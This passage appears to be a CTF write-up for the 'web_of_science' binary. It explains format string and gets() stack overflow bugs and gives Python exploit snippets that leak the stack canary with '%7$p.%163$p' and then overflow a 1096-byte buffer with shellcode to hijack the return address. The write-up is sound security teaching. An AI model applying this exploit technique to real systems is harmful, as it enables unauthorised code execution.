It's a simple dynamically linked binary for x86-64. We have a canary stack
however the stack is executable (the '90s says hello!), which `gef`
confirms instantly:

### Vulnerabilities ###

`web_of_science` is a tool to manage scientific papers.
The binary is full of vulnerabilities, many of which were automatically detected
by the `format-string-helper` command from [GDB-GEF](https://github.com/hugsy/gef.git)

![fmt-str-gef](https://i.imgur.com/cqYmZLi.png)

Without any static analysis, we immediately spot that many (if not all)
`printf()` calls are vulnerable to format string vulnerabilities, where we
control the format field. That's good, we can leverage that later to bypass the
canary protection. So far, so good ☺

<!--more-->

So what does the binary do? It starts by call the function at 0x04007CD which
checks if we are human by prompting us to solve an addition with randomly
generated integers. Pretty hardcore stuff, right?

Then we jump into serious business at 0x400E1C. The function offers a menu to
respectively add/delete/list/view papers and exit.

When adding a paper (`add_paper()` function), a stack buffer of 1096 bytes is
allocated on the stack. It is then possible to populate different fields of this
stack allocated paper as shown here:

![add-paper-fill-info](https://i.imgur.com/dTZmTgS.png)

When saving the stack buffer is then copied to the .bss segment:

{% highlight bash %}

{% endhighlight %}

One stricking thing is of course the massive use of `gets()` everywhere for user
input. So we think immediately to stack-based buffer overflow.

The `view_paper()` function (at 0x400D52) receives a pointer to a paper and
displays its information using `printf()` - which makes us understand what
triggered the `gef` plugin for format string.

### Exploitation ###

The exploitation process will go something like this:

   1. Use of the format string vulnerabilities to leak stack until we get the
      canary using `printf()`
   1. Overflow one of the stack allocated buffer using `gets()`, correctly
      insert the canary, and jump to our stack-based shellcode.

So this lines up the following sequential steps:

   - Create a paper to allocate a 1096 byte stack buffer
{% highlight python %}
    ok("Adding a paper")
    s.read_until("> ")
    s.write("1\n") # add_paper

    ok("Adding paper name")
    s.read_until("> ")
    s.write("1\n") # add_paper_name
    s.read_until("Paper name: ")
    s.write('A'*10+"\n")
{% endhighlight %}

   - Using the abstract field of the paper to store our format string to leak
    the canary, and the stack address (for returning to it).
{% highlight python %}
    ok("Adding paper abstract")
    s.read_until("> ")
    s.write("3\n") # add_paper_abstract
    s.read_until("Paper abstract: ")
    s.write("%7$p.%163$p" + "\n")
{% endhighlight %}
   A stack address was found at `"$7$p"` and the canary at `"%163$p"`.

   - We need to view the paper to actually trigger the format string information
     leak:
{% highlight python %}
    s.read_until("> ")
    s.write("5\n") # view_paper_info
    s.read_until("Abstract:\n\t")
    paper_addr, canary = s.read_until("\nTags:\n\t")[:-8].split('.', 1)
    paper_addr = int(paper_addr, 16)
    canary = int(canary, 16)
    ok("Got addr: %#x" % paper_addr)
    ok("Got canary: %#x" % canary)
{% endhighlight %}

   - And now, build our payload, overflow the buffer, insert the canary to get
   good karma, and make the `ret` at 0x400C0E fall back to our controlled
   buffer:
{% highlight python %}
    s.read_until("> ")
    s.write("1\n") # add_paper_name
    ok("Sending payload")
    payload = ""
    payload+= "\x90"*0x8
    payload+= SC
    payload+= "\x90"*(1096-len(payload))
    payload+= q_s(canary) + "JUNK"*2 + q_s(paper_addr)
    s.read_until("Paper name: ")
    s.write(payload + '\n')

    s.read_until("> ")
    s.write("6\n") # quit to trigger the ret
{% endhighlight %}

And the execution gives:
